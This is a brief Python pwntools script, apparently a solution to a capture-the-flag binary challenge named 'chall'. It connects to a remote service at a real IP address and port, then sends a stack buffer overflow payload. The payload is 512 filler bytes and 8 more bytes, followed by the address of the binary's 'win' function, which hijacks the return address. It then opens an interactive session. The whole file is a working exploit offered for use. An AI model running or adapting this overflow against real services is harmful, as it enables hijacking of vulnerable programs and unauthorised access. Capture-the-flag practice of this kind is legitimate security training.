from pwn import *

p = remote('34.76.206.46', 10002)
elf = ELF("./chall", checksec=False)

payload = b"A" * 512 + b"B" * 8 + p64(elf.sym["win"])
p.sendline(payload)

p.interactive()
